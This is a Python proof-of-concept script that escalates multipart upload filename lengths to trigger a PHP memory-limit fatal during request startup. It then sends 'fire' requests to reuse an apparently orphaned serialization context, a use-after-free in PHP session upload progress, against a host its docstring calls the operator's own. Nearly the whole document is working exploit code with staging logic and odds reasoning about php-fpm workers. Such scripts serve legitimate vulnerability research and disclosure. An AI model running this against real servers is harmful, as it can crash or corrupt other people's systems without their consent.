#!/usr/bin/env python3
"""
remote_probe.py — arm/fire against a host the operator owns.

Authorised target: dev-api.openpro.ai (Rémi Pelloux / OpenPro, own infrastructure).
Do not point this at anything else.

What it does, in the order it does it:

  stage A  escalate the multipart *filename* length, one request per size, until
           PHP reports the memory_limit fatal. The fatal text is the proof that
           the OOM happened inside request startup ("in Unknown on line 0"),
           i.e. in php_session_rfc1867_callback -> php_var_serialize_init,
           before PHP_RINIT_FUNCTION(basic) could clear BG(serialize).

  stage B  for each fire attempt: arm with the fatal size, then immediately send
           a second, tiny multipart progress request (a *different* session id)
           and see whether the worker survived it.

Everything is one host, a handful of requests, no loops over targets.
Output is appended to the log you pass with --log so it can be kept as evidence.

Usage:
  python3 remote_probe.py --host dev-api.openpro.ai --sizes 1000000,4000000
  python3 remote_probe.py --host dev-api.openpro.ai --fires 3 --arm 96000000
"""
import argparse
import http.client
import os
import ssl
import sys
import time

BND = "uafcheck" + os.urandom(12).hex()


def build_body(fn_len, data=b"D" * 1000, prog=b"arm-val"):
    """Multipart body whose second part has an fn_len-byte filename.

    The progress field must come first: the rfc1867 handler only creates the
    progress entry after it has seen PHP_SESSION_UPLOAD_PROGRESS. The filename
    is the attacker-controlled string that lands in progress->data and is
    charged to the pre-RINIT serialization.
    """
    head = (
        f'--{BND}\r\n'
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    ).encode() + prog + b"\r\n"
    mid = (
        f'--{BND}\r\n'
        f'Content-Disposition: form-data; name="payload"; filename="'
    ).encode() + b"F" * fn_len + b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    tail = b"\r\n" + f"--{BND}--\r\n".encode()
    return head + mid + data + tail


def send(host, path, body, sid, timeout=120, label="", log=print):
    """One POST. Returns a dict; never raises."""
    ctx = ssl.create_default_context()
    out = dict(label=label, fn_len=None, status=None, elapsed=0.0, req_bytes=len(body),
               resp_bytes=0, error=None, oom_text=False, oom_line0=False, oom_line="")
    t0 = time.time()
    conn = http.client.HTTPSConnection(host, 443, timeout=timeout, context=ctx)
    try:
        conn.request("POST", path, body=body, headers={
            "Content-Type": f"multipart/form-data; boundary={BND}",
            "Content-Length": str(len(body)),
            "Cookie": f"PHPSESSID={sid}",
            "Accept": "*/*",
            "Connection": "close",
            "User-Agent": "php-session-upload-progress-uaf check/1.0 (authorised, own host)",
        })
        r = conn.getresponse()
        data = r.read()
        out["status"] = r.status
        out["resp_bytes"] = len(data)
        text = data.decode("latin-1", "replace")
        out["oom_text"] = "Allowed memory size" in text
        out["oom_line0"] = "Unknown on line 0" in text
        for ln in text.splitlines():
            if "Allowed memory" in ln:
                out["oom_line"] = ln.strip()
                break
        out["head"] = text[:300] if not out["oom_text"] else ""
    except Exception as e:                                    # noqa: BLE001
        out["error"] = f"{type(e).__name__}: {e}"
    finally:
        conn.close()
        out["elapsed"] = round(time.time() - t0, 1)
    log(f"  {label:<14} {out['elapsed']:>6.1f}s  status={out['status']}  "
        f"sent={out['req_bytes']/1e6:.1f}MB  recv={out['resp_bytes']}B  "
        f"oom={out['oom_text']}  {out['error'] or ''}")
    if out["oom_line"]:
        log(f"      -> {out['oom_line']}")
    elif out["head"] and out["status"] and out["status"] >= 500:
        log(f"      5xx head: {out['head'][:160]!r}")
    return out


def fast_fires(args, log, fatal, n):
    """One arm, then n tiny fire requests with no liveness probe in between.

    A GET between arm and fire would run PHP_RINIT_FUNCTION(basic) on that
    worker, memset BG(serialize) and quietly repair it -- so the only request
    that can reuse the orphaned context is another multipart progress POST
    that arrives before anything else touches the worker.
    php-fpm has pm.max_children=12, so each fire has roughly 1/12 odds of
    landing on the poisoned child.
    """
    log(f"\n[stage C] one arm at {fatal/1e6:.0f}MB, then {n} fire requests")
    send(args.host, args.path, build_body(fatal), "uafarm" + os.urandom(8).hex(),
         args.timeout, "arm", log)
    bad = 0
    for i in range(n):
        r = send(args.host, args.path, build_body(200, data=b"x" * 200),
                 "uaffire" + os.urandom(8).hex(), args.timeout, f"fire {i+1}", log)
        if r["error"] or (r["status"] or 0) >= 500:
            bad += 1
            log(f"      !! fire {i+1} did not get a normal Laravel answer")
    log(f"  fires with abnormal answer: {bad}/{n}")
    _alive(args.host, args.path, args.timeout, log)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="dev-api.openpro.ai")
    ap.add_argument("--path", default="/")
    ap.add_argument("--sizes", help="comma-separated filename lengths for stage A")
    ap.add_argument("--arm", type=int, help="known-fatal filename length, skip stage A")
    ap.add_argument("--fires", type=int, default=0, help="stage B attempts")
    ap.add_argument("--fast-fires", type=int, default=0,
                    help="stage C: one arm, then N small fires, no liveness in between")
    ap.add_argument("--timeout", type=int, default=180)
    ap.add_argument("--log", default="")
    args = ap.parse_args()

    fh = open(args.log, "a", buffering=1) if args.log else None
    def log(*a):
        line = " ".join(str(x) for x in a)
        print(line, flush=True)
        if fh:
            fh.write(line + "\n")

    log(f"\n=== {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} target https://{args.host}{args.path}")
    log(f"    boundary={BND}")

    fatal = args.arm
    if args.sizes:
        log("\n[stage A] escalate the filename length until memory_limit trips")
        for n in [int(x) for x in args.sizes.split(",") if x.strip()]:
            sid = "uafarm" + os.urandom(8).hex()
            r = send(args.host, args.path, build_body(n), sid, args.timeout,
                     f"arm {n/1e6:.0f}MB", log)
            r["fn_len"] = n
            if r["oom_text"] or r["error"] or (r["status"] or 0) >= 500:
                fatal = n
                log(f"  -> stop: the startup fatal reproduces at a {n/1e6:.0f}MB filename")
                break
            if _alive(args.host, args.path, args.timeout, log) is False:
                fatal = n
                log("  -> stop: host not answering after that request")
                break

    if fatal and args.fires:
        log(f"\n[stage B] arm at {fatal/1e6:.0f}MB, then fire a small reuse request")
        for i in range(args.fires):
            log(f"\n  -- attempt {i+1}/{args.fires}")
            send(args.host, args.path, build_body(fatal), "uafarm" + os.urandom(8).hex(),
                 args.timeout, "arm", log)
            time.sleep(0.3)
            send(args.host, args.path, build_body(10, data=b"x" * 100),
                 "uaffire" + os.urandom(8).hex(), args.timeout, "fire", log)
            time.sleep(0.5)
            _alive(args.host, args.path, args.timeout, log)
    if fatal and args.fast_fires:
        fast_fires(args, log, fatal, args.fast_fires)
    if fh:
        fh.close()


def _alive(host, path, timeout, log):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(host, 443, timeout=timeout, context=ctx)
    t0 = time.time()
    try:
        conn.request("GET", path, headers={"Connection": "close",
                                          "User-Agent": "uaf-check liveness"})
        r = conn.getresponse()
        r.read()
        log(f"  liveness       {time.time()-t0:>6.1f}s  status={r.status}")
        return True
    except Exception as e:                                    # noqa: BLE001
        log(f"  liveness       {time.time()-t0:>6.1f}s  FAILED {type(e).__name__}: {e}")
        return False
    finally:
        conn.close()


if __name__ == "__main__":
    main()
